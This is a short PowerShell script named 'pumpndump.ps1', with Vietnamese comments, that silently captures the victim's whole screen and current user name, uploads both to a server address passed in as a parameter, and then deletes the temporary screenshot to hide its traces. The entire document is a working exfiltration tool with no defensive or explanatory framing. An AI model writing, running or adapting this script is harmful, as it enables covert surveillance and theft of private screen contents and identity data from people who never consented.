# PowerShell Script: pumpndump.ps1
param (
    [string]$hq
)

# Lấy tên người dùng hiện tại
$name = whoami

# Chụp màn hình và lưu tạm thời
$screenshotPath = "$env:temp\screenshot.png"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bmp.Size)
$bmp.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)

# Gửi dữ liệu tới server
$uri = "$hq/upload"
$client = New-Object System.Net.WebClient
$client.Headers.Add("Content-Type", "multipart/form-data")
$fileContent = Get-Content -Path $screenshotPath -Encoding Byte
$client.UploadData($uri, $fileContent)

# Gửi tên người dùng
$client.Headers.Clear()
$client.Headers.Add("Content-Type", "application/json")
$data = @{ name = $name }
$jsonData = $data | ConvertTo-Json
$client.UploadString("$hq/data", "POST", $jsonData)

# Xoá file tạm
Remove-Item $screenshotPath -Force
